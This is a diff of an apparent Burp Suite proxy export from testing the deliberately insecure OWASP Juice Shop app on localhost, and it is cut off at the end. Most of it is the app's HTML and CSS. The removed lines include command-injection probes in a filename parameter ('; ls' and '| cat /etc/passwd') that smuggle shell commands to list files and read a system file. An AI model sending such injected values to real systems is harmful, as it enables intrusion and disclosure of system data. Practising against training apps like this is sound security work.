@@ -1,5 +1,4 @@
-<?xml version="1.1"?>
-<!-- NOTE: Any NULL bytes in requests and responses are preserved within this output, even though this strictly breaks the XML syntax. If your XML parser rejects the NULL bytes then you will need to remove or replace these bytes before parsing. Alternatively, you can use the option to base64-encode requests and responses. -->
+<?xml version="1.0"?>
 <!DOCTYPE items [
 <!ELEMENT items (item*)>
 <!ATTLIST items burpVersion CDATA "">
@@ -23,579 +22,421 @@
 <!ATTLIST response base64 (true|false) "false">
 <!ELEMENT comment (#PCDATA)>
 ]>
-<items burpVersion="2026.4.3" exportTime="Fri Jul 10 00:03:07 IST 2026">
+<items burpVersion="2026.7.3" exportTime="Thu Sep 03 23:32:16 IST 2026">
   <item>
-    <time>Fri Jul 10 00:01:55 IST 2026</time>
-    <url><![CDATA[http://localhost:3000/file-upload?filename=%3B%20ls]]></url>
+    <time>Thu Sep 03 23:30:16 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/]]></url>
     <host ip="127.0.0.1">localhost</host>
-    <port>3000</port>
+    <port>9000</port>
     <protocol>http</protocol>
     <method><![CDATA[GET]]></method>
-    <path><![CDATA[/file-upload?filename=%3B%20ls]]></path>
+    <path><![CDATA[/]]></path>
     <extension>null</extension>
-    <request base64="false"><![CDATA[GET /file-upload?filename=%3B%20ls HTTP/1.1
-Host: localhost:3000
-sec-ch-ua-platform: "Windows"
-Accept-Language: en-US,en;q=0.9
-sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
-sec-ch-ua-mobile: ?0
-Accept: */*
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: http://localhost:3000/
-Accept-Encoding: gzip, deflate, br
-Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
-Connection: keep-alive
-
-]]></request>
-    <status>200</status>
-    <responselength>10370</responselength>
-    <mimetype>HTML</mimetype>
-    <response base64="false"><![CDATA[HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-X-Content-Type-Options: nosniff
-X-Frame-Options: SAMEORIGIN
-Feature-Policy: payment 'self'
-X-Recruiting: /#/jobs
-Accept-Ranges: bytes
-Cache-Control: public, max-age=0
-Last-Modified: Thu, 09 Jul 2026 15:29:00 GMT
-ETag: W/"26af-19f477f1b77"
-Content-Type: text/html; charset=UTF-8
-Vary: Accept-Encoding
-Date: Thu, 09 Jul 2026 18:31:55 GMT
-Connection: keep-alive
-Keep-Alive: timeout=5
-Content-Length: 9903
-
-<!--
-  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
-  ~ SPDX-License-Identifier: MIT
-  -->
-
-<!doctype html>
-<html lang="en" data-beasties-container>
-<head>
-  <meta charset="utf-8">
-  <title>OWASP Juice Shop</title>
-  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>
-  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/favicon_js.ico">
-  <script>
-    window.addEventListener("load", function(){
-      window.cookieconsent.initialise({
-        "palette": {
-          "popup": { "background": "var(--theme-primary)", "text": "var(--theme-text)" },
-          "button": { "background": "var(--theme-accent)", "text": "var(--theme-text)" }
-        },
-        "theme": "classic",
-        "position": "bottom-right",
-        "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
-      })});
-  </script>
-<style>.bluegrey-lightgreen-theme{--mat-sys-background:#121316;--mat-sys-error:#ffb4ab;--mat-sys-error-container:#93000a;--mat-sys-inverse-on-surface:#2f3033;--mat-sys-inverse-primary:#005cbb;--mat-sys-inverse-surface:#e3e2e6;--mat-sys-on-background:#e3e2e6;--mat-sys-on-error:#690005;--mat-sys-on-error-container:#ffdad6;--mat-sys-on-primary:#002f65;--mat-sys-on-primary-container:#d7e3ff;--mat-sys-on-primary-fixed:#001b3f;--mat-sys-on-primary-fixed-variant:#00458f;--mat-sys-on-secondary:#283041;--mat-sys-on-secondary-container:#dae2f9;--mat-sys-on-secondary-fixed:#131c2b;--mat-sys-on-secondary-fixed-variant:#3e4759;--mat-sys-on-surface:#e3e2e6;--mat-sys-on-surface-variant:#e0e2ec;--mat-sys-on-tertiary:#173800;--mat-sys-on-tertiary-container:#82ff10;--mat-sys-on-tertiary-fixed:#0b2000;--mat-sys-on-tertiary-fixed-variant:#245100;--mat-sys-outline:#8e9099;--mat-sys-outline-variant:#44474e;--mat-sys-primary:#abc7ff;--mat-sys-primary-container:#00458f;--mat-sys-primary-fixed:#d7e3ff;--mat-sys-primary-fixed-dim:#abc7ff;--mat-sys-scrim:#000000;--mat-sys-secondary:#bec6dc;--mat-sys-secondary-container:#3e4759;--mat-sys-secondary-fixed:#dae2f9;--mat-sys-secondary-fixed-dim:#bec6dc;--mat-sys-shadow:#000000;--mat-sys-surface:#121316;--mat-sys-surface-bright:#38393c;--mat-sys-surface-container:#1f2022;--mat-sys-surface-container-high:#292a2c;--mat-sys-surface-container-highest:#343537;--mat-sys-surface-container-low:#1a1b1f;--mat-sys-surface-container-lowest:#0d0e11;--mat-sys-surface-dim:#121316;--mat-sys-surface-tint:#abc7ff;--mat-sys-surface-variant:#44474e;--mat-sys-tertiary:#70e000;--mat-sys-tertiary-container:#245100;--mat-sys-tertiary-fixed:#82ff10;--mat-sys-tertiary-fixed-dim:#70e000;--mat-sys-neutral-variant20:#2d3038;--mat-sys-neutral10:#1a1b1f;--mat-sys-level0:0px 0px 0px 0px rgba(0, 0, 0, .2), 0px 0px 0px 0px rgba(0, 0, 0, .14), 0px 0px 0px 0px rgba(0, 0, 0, .12);--mat-sys-level1:0px 2px 1px -1px rgba(0, 0, 0, .2), 0px 1px 1px 0px rgba(0, 0, 0, .14), 0px 1px 3px 0px rgba(0, 0, 0, .12);--mat-sys-level2:0px 3px 3px -2px rgba(0, 0, 0, .2), 0px 3px 4px 0px rgba(0, 0, 0, .14), 0px 1px 8px 0px rgba(0, 0, 0, .12);--mat-sys-level3:0px 3px 5px -1px rgba(0, 0, 0, .2), 0px 6px 10px 0px rgba(0, 0, 0, .14), 0px 1px 18px 0px rgba(0, 0, 0, .12);--mat-sys-level4:0px 5px 5px -3px rgba(0, 0, 0, .2), 0px 8px 10px 1px rgba(0, 0, 0, .14), 0px 3px 14px 2px rgba(0, 0, 0, .12);--mat-sys-level5:0px 7px 8px -4px rgba(0, 0, 0, .2), 0px 12px 17px 2px rgba(0, 0, 0, .14), 0px 5px 22px 4px rgba(0, 0, 0, .12);--mat-sys-corner-extra-large:28px;--mat-sys-corner-extra-large-top:28px 28px 0 0;--mat-sys-corner-extra-small:4px;--mat-sys-corner-extra-small-top:4px 4px 0 0;--mat-sys-corner-full:9999px;--mat-sys-corner-large:16px;--mat-sys-corner-large-end:0 16px 16px 0;--mat-sys-corner-large-start:16px 0 0 16px;--mat-sys-corner-large-top:16px 16px 0 0;--mat-sys-corner-medium:12px;--mat-sys-corner-none:0;--mat-sys-corner-small:8px;--mat-sys-dragged-state-layer-opacity:.16;--mat-sys-focus-state-layer-opacity:.12;--mat-sys-hover-state-layer-opacity:.08;--mat-sys-pressed-state-layer-opacity:.12;color:var(--mat-sys-on-surface);background-color:var(--mat-sys-surface)}html{font-family:var(--mat-sys-body-medium-font, Roboto, "Helvetica Neue", sans-serif)}.bluegrey-lightgreen-theme{--theme-primary:#438fff;--theme-primary-lighter:rgb(97.6, 161.229787234, 255);--theme-primary-light:rgb(118, 173.3829787234, 255);--theme-primary-darker:rgb(36.4, 124.770212766, 255);--theme-primary-dark:rgb(16, 112.6170212766, 255);--theme-primary-fade-10:#438fff;--theme-primary-fade-20:#438fff;--theme-primary-fade-30:#438fff;--theme-primary-fade-40:#438fff;--theme-primary-fade-50:#438fff;--theme-accent:#50a400;--theme-accent-lighter:rgb(94.9268292683, 194.6, 0);--theme-accent-light:rgb(104.8780487805, 215, 0);--theme-accent-darker:rgb(65.0731707317, 133.4, 0);--theme-accent-dark:rgb(55.1219512195, 113, 0);--theme-accent-fade-10:#50a400;--theme-accent-fade-20:#50a400;--theme-accent-fade-30:#50a400;--theme-accent-fade-40:#50a400;--theme-accent-fade-50:#50a400;--theme-warn:#ffb4ab;--theme-warn-lighter:rgb(255, 207.3214285714, 201.6);--theme-warn-light:rgb(255, 225.5357142857, 222);--theme-warn-darker:rgb(255, 152.6785714286, 140.4);--theme-warn-dark:rgb(255, 134.4642857143, 120);--theme-warn-fade-10:#ffb4ab;--theme-warn-fade-20:#ffb4ab;--theme-warn-fade-30:#ffb4ab;--theme-warn-fade-40:#ffb4ab;--theme-warn-fade-50:#ffb4ab;--theme-text:#e3e2e6;--theme-text-lighter:rgb(242.8666666667, 242.4333333333, 244.1666666667);--theme-text-light:rgb(253.4444444444, 253.3888888889, 253.6111111111);--theme-text-darker:rgb(200.5555555556, 198.6111111111, 206.3888888889);--theme-text-dark:rgb(160.8888888889, 157.5277777778, 170.9722222222);--theme-text-fade-10:#e3e2e6;--theme-text-fade-20:#e3e2e6;--theme-text-fade-30:#e3e2e6;--theme-text-fade-40:#e3e2e6;--theme-text-fade-50:#e3e2e6;--theme-text-invert-15:rgb(197.15, 196.45, 199.25);--theme-text-invert-30:rgb(167.3, 166.9, 168.5);--theme-background:#1f2022;--theme-background-lighter:rgb(45.5938461538, 47.0646153846, 50.0061538462);--theme-background-light:rgb(55.3230769231, 57.1076923077, 60.6769230769);--theme-background-darker:rgb(16.4061538462, 16.9353846154, 17.9938461538);--theme-background-dark:rgb(6.6769230769, 6.8923076923, 7.3230769231);--theme-background-darkest:hsl(220, 4.6153846154%, -1.2549019608%);--theme-thumbnail-border:1px solid #abc7ff;--mdc-filled-text-field-container-color:#0000;--mdc-filled-text-field-disabled-container-color:#0000;--theme-background:#3e3e3e;--theme-background-lighter:#4a4a4a;--theme-background-light:#5a5a5a;--theme-background-darker:#333638;--theme-background-dark:#303030;--theme-background-darkest:#2b2b2b;--theme-text:#e8ecef;--theme-text-lighter:#f2f5f7;--theme-text-light:#fff;--theme-text-darker:#b8c0c7;--theme-text-dark:#7f8a93;--mat-sys-surface:#333638;--mat-sys-on-surface:#e8ecef;--mat-sys-surface-container:#3e3e3e;--mat-sys-surface-container-high:#404244;--mat-sys-on-surface-variant:#b8c0c7;--mat-sys-outline:#5a5a5a;--mat-sys-outline-variant:#404244}.bluegrey-lightgreen-theme{--theme-warn:#f44336;--theme-warn-lighter:rgb(245.5877358491, 94.1358490566, 83.0122641509);--theme-warn-light:rgb(246.6462264151, 112.2264150943, 102.3537735849);--theme-warn-darker:rgb(242.4122641509, 39.8641509434, 24.9877358491);--theme-warn-dark:rgb(234.1839622642, 27.9622641509, 12.8160377358);--theme-warn-fade-10:#f44336;--theme-warn-fade-20:#f44336;--theme-warn-fade-30:#f44336;--theme-warn-fade-40:#f44336;--theme-warn-fade-50:#f44336;--mat-sys-error:#f44336;--mat-sys-on-error:#fff}@media screen and (-webkit-min-device-pixel-ratio:0){}</style><link rel="stylesheet" href="styles.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.css"></noscript></head>
-<body class="bluegrey-lightgreen-theme">
-  <app-root></app-root>
-<link rel="modulepreload" href="chunk-KD3CNUZG.js"><link rel="modulepreload" href="chunk-PX7UKXVL.js"><link rel="modulepreload" href="chunk-Y3BEW76R.js"><link rel="modulepreload" href="chunk-R7LX7FKI.js"><link rel="modulepreload" href="chunk-7U6P4YGV.js"><link rel="modulepreload" href="chunk-UNFVUBM2.js"><link rel="modulepreload" href="chunk-KI34UYIE.js"><link rel="modulepreload" href="chunk-B3RFAYKZ.js"><link rel="modulepreload" href="chunk-EMJTEAHL.js"><link rel="modulepreload" href="chunk-6RWMKLEX.js"><script src="polyfills.js" type="module"></script><script src="scripts.js" defer></script><script src="main.js" type="module"></script></body>
-</html>
-]]></response>
+    <request base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWE6ICJOb3Q7QT1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTUwIg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KSWYtTm9uZS1NYXRjaDogVy8iMjRiMS0xYTA2N2Y0MGViMiINCklmLU1vZGlmaWVkLVNpbmNlOiBUaHUsIDAzIFNlcCAyMDI2IDE1OjQ3OjIyIEdNVA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>392</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KQ2FjaGUtQ29udHJvbDogcHVibGljLCBtYXgtYWdlPTANCkxhc3QtTW9kaWZpZWQ6IFRodSwgMDMgU2VwIDIwMjYgMTU6NDc6MjIgR01UDQpFVGFnOiBXLyIyNGIxLTFhMDY3ZjQwZWIyIg0KRGF0ZTogVGh1LCAwMyBTZXAgMjAyNiAxODowMDoxNiBHTVQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCktlZXAtQWxpdmU6IHRpbWVvdXQ9NQ0KDQo=]]></response>
     <comment></comment>
   </item>
   <item>
-    <time>Fri Jul 10 00:01:55 IST 2026</time>
-    <url><![CDATA[http://localhost:3000/file-upload?filename=%7C%20cat%20%2Fetc%2Fpasswd]]></url>
+    <time>Thu Sep 03 23:30:17 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/api/Challenges/?name=Score%20Board]]></url>
     <host ip="127.0.0.1">localhost</host>
-    <port>3000</port>
+    <port>9000</port>
     <protocol>http</protocol>
     <method><![CDATA[GET]]></method>
-    <path><![CDATA[/file-upload?filename=%7C%20cat%20%2Fetc%2Fpasswd]]></path>
+    <path><![CDATA[/api/Challenges/?name=Score%20Board]]></path>
     <extension>null</extension>
-    <request base64="false"><![CDATA[GET /file-upload?filename=%7C%20cat%20%2Fetc%2Fpasswd HTTP/1.1
-Host: localhost:3000
-sec-ch-ua-platform: "Windows"
-Accept-Language: en-US,en;q=0.9
-sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
-sec-ch-ua-mobile: ?0
-Accept: */*
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: http://localhost:3000/
-Accept-Encoding: gzip, deflate, br
-Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
-Connection: keep-alive
-
-]]></request>
-    <status>200</status>
-    <responselength>10370</responselength>
-    <mimetype>HTML</mimetype>
-    <response base64="false"><![CDATA[HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-X-Content-Type-Options: nosniff
-X-Frame-Options: SAMEORIGIN
-Feature-Policy: payment 'self'
-X-Recruiting: /#/jobs
-Accept-Ranges: bytes
-Cache-Control: public, max-age=0
-Last-Modified: Thu, 09 Jul 2026 15:29:00 GMT
-ETag: W/"26af-19f477f1b77"
-Content-Type: text/html; charset=UTF-8
-Vary: Accept-Encoding
-Date: Thu, 09 Jul 2026 18:31:55 GMT
-Connection: keep-alive
-Keep-Alive: timeout=5
-Content-Length: 9903
-
-<!--
-  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
-  ~ SPDX-License-Identifier: MIT
-  -->
-
-<!doctype html>
-<html lang="en" data-beasties-container>
-<head>
-  <meta charset="utf-8">
-  <title>OWASP Juice Shop</title>
-  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>
-  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/favicon_js.ico">
-  <script>
-    window.addEventListener("load", function(){
-      window.cookieconsent.initialise({
-        "palette": {
-          "popup": { "background": "var(--theme-primary)", "text": "var(--theme-text)" },
-          "button": { "background": "var(--theme-accent)", "text": "var(--theme-text)" }
-        },
-        "theme": "classic",
-        "position": "bottom-right",
-        "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
-      })});
-  </script>
-<style>.bluegrey-lightgreen-theme{--mat-sys-background:#121316;--mat-sys-error:#ffb4ab;--mat-sys-error-container:#93000a;--mat-sys-inverse-on-surface:#2f3033;--mat-sys-inverse-primary:#005cbb;--mat-sys-inverse-surface:#e3e2e6;--mat-sys-on-background:#e3e2e6;--mat-sys-on-error:#690005;--mat-sys-on-error-container:#ffdad6;--mat-sys-on-primary:#002f65;--mat-sys-on-primary-container:#d7e3ff;--mat-sys-on-primary-fixed:#001b3f;--mat-sys-on-primary-fixed-variant:#00458f;--mat-sys-on-secondary:#283041;--mat-sys-on-secondary-container:#dae2f9;--mat-sys-on-secondary-fixed:#131c2b;--mat-sys-on-secondary-fixed-variant:#3e4759;--mat-sys-on-surface:#e3e2e6;--mat-sys-on-surface-variant:#e0e2ec;--mat-sys-on-tertiary:#173800;--mat-sys-on-tertiary-container:#82ff10;--mat-sys-on-tertiary-fixed:#0b2000;--mat-sys-on-tertiary-fixed-variant:#245100;--mat-sys-outline:#8e9099;--mat-sys-outline-variant:#44474e;--mat-sys-primary:#abc7ff;--mat-sys-primary-container:#00458f;--mat-sys-primary-fixed:#d7e3ff;--mat-sys-primary-fixed-dim:#abc7ff;--mat-sys-scrim:#000000;--mat-sys-secondary:#bec6dc;--mat-sys-secondary-container:#3e4759;--mat-sys-secondary-fixed:#dae2f9;--mat-sys-secondary-fixed-dim:#bec6dc;--mat-sys-shadow:#000000;--mat-sys-surface:#121316;--mat-sys-surface-bright:#38393c;--mat-sys-surface-container:#1f2022;--mat-sys-surface-container-high:#292a2c;--mat-sys-surface-container-highest:#343537;--mat-sys-surface-container-low:#1a1b1f;--mat-sys-surface-container-lowest:#0d0e11;--mat-sys-surface-dim:#121316;--mat-sys-surface-tint:#abc7ff;--mat-sys-surface-variant:#44474e;--mat-sys-tertiary:#70e000;--mat-sys-tertiary-container:#245100;--mat-sys-tertiary-fixed:#82ff10;--mat-sys-tertiary-fixed-dim:#70e000;--mat-sys-neutral-variant20:#2d3038;--mat-sys-neutral10:#1a1b1f;--mat-sys-level0:0px 0px 0px 0px rgba(0, 0, 0, .2), 0px 0px 0px 0px rgba(0, 0, 0, .14), 0px 0px 0px 0px rgba(0, 0, 0, .12);--mat-sys-level1:0px 2px 1px -1px rgba(0, 0, 0, .2), 0px 1px 1px 0px rgba(0, 0, 0, .14), 0px 1px 3px 0px rgba(0, 0, 0, .12);--mat-sys-level2:0px 3px 3px -2px rgba(0, 0, 0, .2), 0px 3px 4px 0px rgba(0, 0, 0, .14), 0px 1px 8px 0px rgba(0, 0, 0, .12);--mat-sys-level3:0px 3px 5px -1px rgba(0, 0, 0, .2), 0px 6px 10px 0px rgba(0, 0, 0, .14), 0px 1px 18px 0px rgba(0, 0, 0, .12);--mat-sys-level4:0px 5px 5px -3px rgba(0, 0, 0, .2), 0px 8px 10px 1px rgba(0, 0, 0, .14), 0px 3px 14px 2px rgba(0, 0, 0, .12);--mat-sys-level5:0px 7px 8px -4px rgba(0, 0, 0, .2), 0px 12px 17px 2px rgba(0, 0, 0, .14), 0px 5px 22px 4px rgba(0, 0, 0, .12);--mat-sys-corner-extra-large:28px;--mat-sys-corner-extra-large-top:28px 28px 0 0;--mat-sys-corner-extra-small:4px;--mat-sys-corner-extra-small-top:4px 4px 0 0;--mat-sys-corner-full:9999px;--mat-sys-corner-large:16px;--mat-sys-corner-large-end:0 16px 16px 0;--mat-sys-corner-large-start:16px 0 0 16px;--mat-sys-corner-large-top:16px 16px 0 0;--mat-sys-corner-medium:12px;--mat-sys-corner-none:0;--mat-sys-corner-small:8px;--mat-sys-dragged-state-layer-opacity:.16;--mat-sys-focus-state-layer-opacity:.12;--mat-sys-hover-state-layer-opacity:.08;--mat-sys-pressed-state-layer-opacity:.12;color:var(--mat-sys-on-surface);background-color:var(--mat-sys-surface)}html{font-family:var(--mat-sys-body-medium-font, Roboto, "Helvetica Neue", sans-serif)}.bluegrey-lightgreen-theme{--theme-primary:#438fff;--theme-primary-lighter:rgb(97.6, 161.229787234, 255);--theme-primary-light:rgb(118, 173.3829787234, 255);--theme-primary-darker:rgb(36.4, 124.770212766, 255);--theme-primary-dark:rgb(16, 112.6170212766, 255);--theme-primary-fade-10:#438fff;--theme-primary-fade-20:#438fff;--theme-primary-fade-30:#438fff;--theme-primary-fade-40:#438fff;--theme-primary-fade-50:#438fff;--theme-accent:#50a400;--theme-accent-lighter:rgb(94.9268292683, 194.6, 0);--theme-accent-light:rgb(104.8780487805, 215, 0);--theme-accent-darker:rgb(65.0731707317, 133.4, 0);--theme-accent-dark:rgb(55.1219512195, 113, 0);--theme-accent-fade-10:#50a400;--theme-accent-fade-20:#50a400;--theme-accent-fade-30:#50a400;--theme-accent-fade-40:#50a400;--theme-accent-fade-50:#50a400;--theme-warn:#ffb4ab;--theme-warn-lighter:rgb(255, 207.3214285714, 201.6);--theme-warn-light:rgb(255, 225.5357142857, 222);--theme-warn-darker:rgb(255, 152.6785714286, 140.4);--theme-warn-dark:rgb(255, 134.4642857143, 120);--theme-warn-fade-10:#ffb4ab;--theme-warn-fade-20:#ffb4ab;--theme-warn-fade-30:#ffb4ab;--theme-warn-fade-40:#ffb4ab;--theme-warn-fade-50:#ffb4ab;--theme-text:#e3e2e6;--theme-text-lighter:rgb(242.8666666667, 242.4333333333, 244.1666666667);--theme-text-light:rgb(253.4444444444, 253.3888888889, 253.6111111111);--theme-text-darker:rgb(200.5555555556, 198.6111111111, 206.3888888889);--theme-text-dark:rgb(160.8888888889, 157.5277777778, 170.9722222222);--theme-text-fade-10:#e3e2e6;--theme-text-fade-20:#e3e2e6;--theme-text-fade-30:#e3e2e6;--theme-text-fade-40:#e3e2e6;--theme-text-fade-50:#e3e2e6;--theme-text-invert-15:rgb(197.15, 196.45, 199.25);--theme-text-invert-30:rgb(167.3, 166.9, 168.5);--theme-background:#1f2022;--theme-background-lighter:rgb(45.5938461538, 47.0646153846, 50.0061538462);--theme-background-light:rgb(55.3230769231, 57.1076923077, 60.6769230769);--theme-background-darker:rgb(16.4061538462, 16.9353846154, 17.9938461538);--theme-background-dark:rgb(6.6769230769, 6.8923076923, 7.3230769231);--theme-background-darkest:hsl(220, 4.6153846154%, -1.2549019608%);--theme-thumbnail-border:1px solid #abc7ff;--mdc-filled-text-field-container-color:#0000;--mdc-filled-text-field-disabled-container-color:#0000;--theme-background:#3e3e3e;--theme-background-lighter:#4a4a4a;--theme-background-light:#5a5a5a;--theme-background-darker:#333638;--theme-background-dark:#303030;--theme-background-darkest:#2b2b2b;--theme-text:#e8ecef;--theme-text-lighter:#f2f5f7;--theme-text-light:#fff;--theme-text-darker:#b8c0c7;--theme-text-dark:#7f8a93;--mat-sys-surface:#333638;--mat-sys-on-surface:#e8ecef;--mat-sys-surface-container:#3e3e3e;--mat-sys-surface-container-high:#404244;--mat-sys-on-surface-variant:#b8c0c7;--mat-sys-outline:#5a5a5a;--mat-sys-outline-variant:#404244}.bluegrey-lightgreen-theme{--theme-warn:#f44336;--theme-warn-lighter:rgb(245.5877358491, 94.1358490566, 83.0122641509);--theme-warn-light:rgb(246.6462264151, 112.2264150943, 102.3537735849);--theme-warn-darker:rgb(242.4122641509, 39.8641509434, 24.9877358491);--theme-warn-dark:rgb(234.1839622642, 27.9622641509, 12.8160377358);--theme-warn-fade-10:#f44336;--theme-warn-fade-20:#f44336;--theme-warn-fade-30:#f44336;--theme-warn-fade-40:#f44336;--theme-warn-fade-50:#f44336;--mat-sys-error:#f44336;--mat-sys-on-error:#fff}@media screen and (-webkit-min-device-pixel-ratio:0){}</style><link rel="stylesheet" href="styles.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.css"></noscript></head>
-<body class="bluegrey-lightgreen-theme">
-  <app-root></app-root>
